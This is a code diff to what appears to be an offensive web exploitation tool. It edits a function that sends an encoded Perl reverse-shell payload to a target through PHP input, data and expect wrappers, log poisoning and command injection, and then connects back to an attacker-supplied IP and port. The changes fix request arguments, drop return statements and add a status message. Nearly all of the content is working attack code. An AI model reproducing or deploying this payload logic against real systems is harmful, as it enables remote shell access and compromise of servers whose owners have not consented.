@@ -5,6 +5,7 @@ from src.utils.args_check import headers
 from src.utils.arguments import args
 from src.attacks.logPoison import exploit_log_poison
 from src.utils.info import printInfo
+from src.utils import colors
 
 def exploit_perl(exploit, method, ip, port):
 
@@ -16,49 +17,50 @@ def exploit_perl(exploit, method, ip, port):
                   "(\"tcp\"))%3bif(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">%26S\")%3bopen(STDOUT,\">%26S\")%3bopen"\
                   "(STDERR,\">%26S\")%3bexec(\"/bin/sh+-i\")%3b}%3b'"
 
+    print(colors.purple("[?]") + " Checking if perl is available on the target system...")
+
     if(method == "INPUT"): 
         res, _ = request.REQUEST(url.replace(config.tempArg, encode(perlTest)), args.httpheaders, exploit['POSTVAL'], config.proxies, "", "")
         if("/bin" in res.text and "/perl" in res.text):
             u = url.replace(config.tempArg, encode(perlPayload))
             printInfo(ip, port, "perl", "input wrapper")
             request.REQUEST(u, args.httpheaders, exploit['POSTVAL'], config.proxies, "", "")
-            return True
+
     if(method == "DATA"):
         if(args.postreq): 
             res, _ = request.REQUEST(url.replace(config.tempArg, encode(perlTest)), args.httpheaders, post, config.proxies, "", "")
         else: 
-            res, _ = request.REQUEST(url.replace(config.tempArg, encode(perlTest)), args.httpheaders, config.proxies, "", "")
+            res, _ = request.REQUEST(url.replace(config.tempArg, encode(perlTest)), args.httpheaders, "", config.proxies, "", "")
         if("/bin" in res.text and "/perl" in res.text):
             printInfo(ip, port, "perl", "data wrapper")
             if(args.postreq):
                 request.REQUEST(url.replace(config.tempArg, encode(perlPayload)), args.httpheaders, post, config.proxies, "", "")
             else: 
-                request.REQUEST(url.replace(config.tempArg, encode(perlPayload)), args.httpheaders, config.proxies, "", "")
-            return True
+                request.REQUEST(url.replace(config.tempArg, encode(perlPayload)), args.httpheaders, "", config.proxies, "", "")
+
     if(method == "EXPECT"):
         if(args.postreq): 
             res, _ = request.REQUEST(url, args.httpheaders, post.replace(config.tempArg, encode(perlPayload)), config.proxies, "", "")
         else: 
-            res, _ = request.REQUEST(url.replace(config.tempArg, encode(perlTest)), args.httpheaders, config.proxies, "", "")
+            res, _ = request.REQUEST(url.replace(config.tempArg, encode(perlTest)), args.httpheaders, "", config.proxies, "", "")
         if("/bin" in res.text and "/perl" in res.text):
             printInfo(ip, port, "perl", "expect wrapper")
             if(args.postreq):
                 request.REQUEST(url, args.httpheaders, post.replace(config.tempArg, encode(perlPayload)), config.proxies, "", "")
             else: 
-                request.REQUEST(url.replace(config.tempArg, encode(perlPayload)), args.httpheaders, config.proxies, "", "")
-            return True
+                request.REQUEST(url.replace(config.tempArg, encode(perlPayload)), args.httpheaders, "", config.proxies, "", "")
+
     if(method == "TRUNC"):
         exploit_log_poison(ip, port, url, encode(perlPayload), "", encode(perlTest), "/perl", exploit['POSTVAL'])
-        return True
 
     if(method == "CMD"):
         if(args.postreq):
             res, _ = request.REQUEST(url, args.httpheaders, post.replace(config.tempArg, encode(perlTest)), config.proxies, "", "")
         else: 
-            res,_ = request.REQUEST(url.replace(config.tempArg, encode(perlTest)), args.httpheaders, config.proxies, "", "")
+            res,_ = request.REQUEST(url.replace(config.tempArg, encode(perlTest)), args.httpheaders, "", config.proxies, "", "")
         if("/bin" in res.text and "/perl" in res.text):
             printInfo(ip, port, "perl", "command injection")
             if(args.postreq):
                 request.REQUEST(url, args.httpheaders, post.replace(config.tempArg, encode(perlPayload)), config.proxies, "", "")
-            else: request.REQUEST(url.replace(config.tempArg, encode(perlPayload)), args.httpheaders, config.proxies, "", "")
-            return True
+            else: request.REQUEST(url.replace(config.tempArg, encode(perlPayload)), args.httpheaders, "", config.proxies, "", "")
+  
